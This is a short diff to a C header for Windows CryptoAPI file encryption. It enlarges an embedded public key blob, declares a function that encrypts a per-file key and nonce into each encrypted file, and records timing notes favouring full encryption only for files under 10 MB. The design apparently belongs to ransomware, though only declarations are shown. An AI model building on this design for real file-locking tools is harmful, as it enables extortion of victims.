@@ -6,13 +6,13 @@
 #ifndef __Crypto_h__
 #define __Crypto_h__
 extern HCRYPTPROV hCryptProv;
-extern BYTE publicKeyBlob[148];
+extern BYTE publicKeyBlob[532];
 
 int extractResource();
 int cryptInit();
 
 void cryptCleanUp();
-
+int encryptKey(HANDLE encryptedFile, BYTE* key, BYTE* nonce);
 
 // 9406ms for 1024mb file, 4706ms for 512mb, 1833ms for 200mb, 924ms for 100mb, 474ms for 50mb, 9ms for 1mb, 92ms for 10mb
 // anything less than 10mb. Encrypt full -> time from 0ms to 92ms
